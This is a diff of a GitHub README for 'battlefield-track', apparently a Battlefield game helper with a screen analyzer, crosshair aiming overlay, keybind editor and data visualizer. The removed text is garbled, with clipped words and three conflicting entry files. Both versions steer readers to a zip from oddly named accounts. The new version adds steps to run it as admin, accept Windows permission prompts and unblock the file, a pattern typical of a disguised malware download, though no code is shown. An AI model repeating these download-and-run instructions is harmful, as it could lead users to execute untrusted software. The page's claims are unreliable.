@@ -1,121 +1,214 @@
-[![Download](https://img.shields.io/badge/download-windows--x64-0078D6?style=flat-square&logo=windows)](https://github.com/kevin-kingcode97y3/battlefield-track/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+# 🛠️ battlefield-track - Track, edit, and view game data
 
-# 🎮 battlefield-track
+[![Download battlefield-track](https://img.shields.io/badge/Download%20battlefield--track-blue?style=for-the-badge)](https://github.com/riskarbitragedichloromethane12/battlefield-track)
 
-![License](https://img.shields.io/github/license/kevin-kingcode97y3/battlefield-track) ![Platform](https://img.shields.io/badge/platform-Windows-blue.svg)
+## 🖥️ What battlefield-track does
 
-[![tool](https://img.shields.io/badge/tool-MIT-green?style=flat-square) ![Version](https://img.shields.io/badge/Version-1.2.2-blue?style=flat-square) ![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?style=flat-square) ![Python](https://img.shields.io/badge/Python-3.11%2B-3776AB?style=flat-square&logo=python&logoColor=white) ![Stars](https://img.shields.io/github/stars/kevin-kingcode97y3/battlefield-track?style=flat-square) ![Last Commit](https://img.shields.io/github/last-commit/kevin-kingcode97y3/battlefield-track?style=flat-square)
+battlefield-track is a Windows tool suite for game support and review. It helps you inspect what is on your screen, edit keybinds, and view game data in a clear way.
 
-Battlefield tool suite: screen analyzer, keybind editor, data visualizer
+Use it to:
 
-## 📥 Download
+- Analyze screen content
+- Edit keybinds in a simple layout
+- View match or session data
+- Check live game details in one place
+- Keep common game tools in one app
 
-[![Download Latest](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](../../releases/latest)
+## 📥 Download battlefield-track
 
-1. Download the latest release from the link above
-2. Extract the archive (WinRAR / 7-Zip)
-3. Run `python main.py` (or see Usage below)
-4. Configure settings in `config.yaml`
+Visit this page to download battlefield-track:
 
-## Config
+https://github.com/riskarbitragedichloromethane12/battlefield-track
 
-The `config.yaml` file lets you tweak various settings. Here's a sample:
+Open the page, look for the latest release or the main download file, and save it to your Windows PC.
 
-```yaml
-analyzer:
- debug: False
- region: # Region of screen to analyze (x1, y1, x2, y2)
- x1: 0
- y1: 0
- x2: 800
- y2: 600
- pixel_threshold: 200
-renderer:
- overlay_enabled: True
- crosshair_color: "red"
- crosshair_size: 15
- font_path: 'path/to/your/font.ttf' #Optional, defaults to a built-in font
-handler:
- hotkey_toggle_analyzer: "F9"
- hotkey_: "F10"
-```
+## 🚀 Install on Windows
 
-* `analyzer.debug`: Enable debug prints.
-* `analyzer.region`: Defines the screen region to analyze. Adjust these coordinates to match the area of interest.
-* `analyzer.pixel_threshold`: The pixel intensity threshold for detection.
-* `renderer.overlay_enabled`: Toggles the overlay display.
-* `renderer.crosshair_color`: Sets the color of the crosshair.
-* `renderer.crosshair_size`: Sets the size of the crosshair in pixels.
-* `handler.hotkey_toggle_analyzer`: Hotkey to enable/disable the analyzer.
-* `handler.hotkey_`: Hotkey to trigger a specific action
+1. Open the download page in your browser
+2. Find the latest Windows version
+3. Download the file to your computer
+4. If the file comes in a .zip folder, right-click it and choose Extract All
+5. Open the extracted folder
+6. Run the main app file
+7. If Windows asks for permission, choose Yes
+8. Follow the on-screen steps to finish setup
 
-## FAQ
+If you keep the file in your Downloads folder, you can open it again from there later.
 
-<details>
- <summary>The tool isn't detecting pixels correctly. What do I do?</summary>
- <p>First, double-check the <code>analyzer.region</code> in your <code>config.yaml</code>. Make sure it accuely reflects the area you're trying to analyze. Also, experiment with the <code>analyzer.pixel_threshold</code>. A higher value requires brighter pixels to trigger a detection, while a lower value is more sensitive.</p>
-</details>
+## 🧭 First launch
 
-<details>
- <summary>The overlay is flickering. Any ideas?</summary>
- <p>Flickering can sometimes happen due to refresh e issues or conflicts with other overlays. Try reducing the analysis frequency, or disabling other overlays to see if that helps.</p>
-</details>
+When you open battlefield-track for the first time, the app may take a few seconds to load. That is normal.
 
-<details>
- <summary>Can I use different hotkeys?</summary>
- <p>Absolutely! Edit the <code>handler.hotkey_toggle_analyzer</code> and <code>handler.hotkey_</code> settings in <code>config.yaml</code>. Make sure the hotkeys you choose don't conflict with other applications.</p>
-</details>
+You may see these parts first:
 
-## Requirements
+- A screen analysis panel
+- A keybind editor
+- A data view or log view
+- Settings for window size, hotkeys, and display mode
 
-* Python 3.11+
-* Required Python packages:
+Take a moment to move through each tab or panel before you start using it.
 
- ```bash
- pip install -r requirements.txt
- ```
+## 🎮 Main features
 
-Packages include: `PyYAML`, `Pillow`, `keyboard`, `pynput`, `opencv-python`. These cover handling settings, image processing, hotkey management, and screen .
+### 🖼️ Screen analyzer
 
-## Changelog
+The screen analyzer checks what appears on your display and helps you inspect game UI elements.
 
-* **1.2.0**:
- * Added keybind editor
- * Improved pixel detection accuracy
- * Fixed overlay flickering issues
-* **1.1.0**:
- * Added hotkey support
- * Improved configuion loading
-* **1.0.0**:
- * Initial release
- * Basic screen analysis and overlay functionality## Overview
+Use it to:
 
-* **Screen analysis**: Analyzes a specified region of your screen for pixel changes.
-* **Overlay**: Displays an overlay with a crosshair, providing visual feedback.
-* **Crosshair**: Customizable crosshair for aiming assistance.
-* **Pixel detection**: Detects pixels based on configurable threshold.
-* **Hotkey automation**: Automate actions using hotkeys.
-* **Configuion**: All settings are configurable via `config.yaml`.
-* **Keybind Editor**: Edit and manage keybinds through the GUI.
+- Look at on-screen zones
+- Review visual changes
+- Check where items or markers appear
+- Compare screen states over time
 
-## Troubleshooting
+### ⌨️ Keybind editor
 
-* **Missing `requirements.txt`**: If you get errors about missing modules, make sure you've run `pip install -r requirements.txt`.
-* **Incorrect screen region**: Double-check the `region` settings in `config.yaml`. Incorrect coordinates will lead to inaccue analysis.
-* **Performance issues**: Analyzing a large screen region or using a very low `pixel_threshold` can impact performance. Reduce the region size or increase the threshold.
+The keybind editor lets you change shortcut keys in one place.
 
-## How to Run
+Use it to:
 
-To get started, simply run `core.py`.
+- Set a hotkey for a task
+- Change a key that feels hard to reach
+- Keep your controls simple
+- Save a setup you can use again
 
-```bash
-python engine.py
-```
+### 📊 Data visualizer
 
-Make sure you have all the requirements installed (see below). The tool will start analyzing your screen and display an overlay (if enabled in the config).
+The data visualizer turns raw game data into clear views.
 
+Use it to:
 
+- Read tracked values
+- Spot changes during play
+- Compare one session with another
+- Review data without searching through files
 
----
+### ⚙️ Game helper tools
 
-🎯 Focused on simplicity and performance
+battlefield-track also works as a small tool kit for common game tasks.
+
+It can help with:
+
+- Window checks
+- Hotkey use
+- Screen review
+- Basic game monitoring
+- Quick setup changes
+
+## 🔧 How to use it day to day
+
+Start by opening the app before you launch your game. That makes it easier to set up the screen analyzer and hotkeys first.
+
+A simple workflow:
+
+1. Open battlefield-track
+2. Choose the tool you want
+3. Set your hotkeys or view options
+4. Start your game
+5. Check the app while you play or after your session
+6. Save settings if you want the same layout next time
+
+If you use it often, keep the app on your desktop or taskbar for fast access.
+
+## 🧩 Suggested system setup
+
+battlefield-track is made for Windows and works best on a normal desktop or laptop setup.
+
+A good setup includes:
+
+- Windows 10 or Windows 11
+- A stable mouse and keyboard
+- Enough free disk space for app files and saved data
+- A display with standard HD or higher resolution
+- Internet access for the download and updates
+
+For best results, close extra apps that use a lot of memory before you start.
+
+## 🗂️ Files and folders
+
+After you install or unpack the app, you may see files like these:
+
+- The main app file
+- A settings file
+- A log file
+- A data folder
+- A config file for hotkeys or layout
+
+Do not rename files unless the app asks you to. If you move the app folder, keep all files together.
+
+## 🛠️ Basic setup tips
+
+- Put the app in a folder you can find fast
+- Use a short folder path, such as `C:\Apps\battlefield-track`
+- Keep the app updated when a new release appears
+- Set your hotkeys before a long session
+- Save your preferred view mode after you make changes
+
+If the app has a dark mode or compact mode, use the one that feels easiest to read.
+
+## 🧠 Troubleshooting
+
+### App does not open
+
+- Check that the file finished downloading
+- Make sure you extracted the zip file first
+- Try running the app as admin
+- Restart your PC and open it again
+
+### Windows blocks the file
+
+- Right-click the file
+- Open Properties
+- If you see an Unblock option, select it
+- Run the app again
+
+### Hotkeys do not work
+
+- Open the keybind editor
+- Check for duplicate keys
+- Try a different key combination
+- Make sure another app is not using the same hotkey
+
+### Screen data looks wrong
+
+- Check your display scale settings
+- Make sure the app window is on the correct monitor
+- Refresh the screen analyzer
+- Restart the app after changing resolution
+
+### Data view is empty
+
+- Start the game or tool that sends data
+- Check that the right source is selected
+- Refresh the view
+- Open the app again if the session did not load
+
+## 🔄 Updates
+
+Check the download page from time to time for new versions.
+
+When you update:
+
+1. Download the latest file
+2. Close the current app
+3. Replace the old files if needed
+4. Open the new version
+5. Check your settings after the update
+
+If you keep a copy of your config file, you can restore your layout after an update
+
+## 📌 Repository topics
+
+battlefield-track fits these topics:
+
+automation, battlefield, battlefield-app, battlefield-assistant, battlefield-helper, battlefield-tool, battlefield-toolkit, battlefield-utility, crosshair, game-helper, game-monitor, game-tool, game-utility, gaming-tools, hotkey, open-source, performance, python, screen, windows
+
+## 🖱️ Quick start checklist
+
+- Download battlefield-track from the link above
+- Extract the file if it comes as a zip
+- Open the app on Windows
+- Set your hotkeys
+- Choose the screen or data view you want
+- Start your game
+- Review the results in the app
